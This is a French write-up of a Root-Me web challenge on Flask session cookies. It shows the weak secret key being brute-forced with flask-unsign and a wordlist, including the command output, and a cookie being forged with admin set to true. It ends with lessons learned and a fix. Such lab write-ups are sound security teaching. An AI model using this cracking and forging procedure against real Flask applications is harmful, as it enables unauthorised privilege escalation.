# Flask - Unsecure session

## Infos

- Catégorie : Web - Serveur
- Difficulté / Points : 20
- Fichiers / URL fournis : application Flask avec une page de connexion

## Énoncé

Le développeur web de la société Flask-me vous affirme qu’utiliser une clé secrète robuste est inutile. Prouvez-lui le contraire !

## TL;DR

Flask stocke la session dans un cookie **signé mais pas chiffré**. La clé secrète utilisée pour la signature est faible : on peut la retrouver par **brute-force** avec `flask-unsign`, puis forger un cookie avec `admin` à `true` pour accéder à la page admin.

## Reconnaissance

Après connexion, un cookie de session Flask est présent dans le navigateur :

```txt
eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aib9ow.V2QmwkpSxRrNsrEzFQS5_EXDonk
```

Un cookie Flask est composé de trois parties :
- le contenu de la session, encodé en Base64 (donc lisible par tout le monde) ;
- un timestamp ;
- une **signature** (HMAC) calculée avec la `SECRET_KEY` du serveur.

En décodant la première partie, on obtient `{'admin': 'false', 'username': 'guest'}`. Les droits admin sont donc décidés par un champ stocké côté client.

Mon hypothèse : si la `SECRET_KEY` est faible, je peux la retrouver avec une wordlist et signer mon propre cookie.

## Exploitation

1. Je brute-force la clé secrète avec `flask-unsign` et la wordlist `rockyou.txt` :
   ```bash
   flask-unsign --unsign --cookie eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aib9ow.V2QmwkpSxRrNsrEzFQS5_EXDonk --wordlist rockyou.txt --no-literal-eval
   ```
   ```txt
   [*] Session decodes to: {'admin': 'false', 'username': 'guest'}
   [*] Starting brute-forcer with 8 threads..
   [+] Found secret key after 70144 attempts
   b's3cr3t'
   ```
2. Avec la clé trouvée, je signe un nouveau cookie avec `admin` à `true` :
   ```bash
   flask-unsign --sign --cookie "{'admin': 'true', 'username': 'guest'}" --secret s3cr3t
   ```
3. Je remplace mon cookie par le cookie forgé (avec Burp ou directement dans le navigateur) et j'accède à la page admin. La signature est valide, donc le serveur accepte la session modifiée.

   ![Console admin](img/flask-unsecure-session/1.png)

## Flag

`masqué` *(règles Root-Me)*

## Ce que j'ai appris

- Un cookie **signé** n'est pas **chiffré** : on peut lire son contenu, mais pas le modifier sans connaître la clé.
- La robustesse d'une clé dépend de son entropie : `s3cr3t` est dans `rockyou.txt`, donc elle tombe en quelques secondes.
- Pour corriger : utiliser une `SECRET_KEY` longue et aléatoire (par exemple `secrets.token_hex(32)`), et ne pas stocker les droits de l'utilisateur dans un cookie côté client.
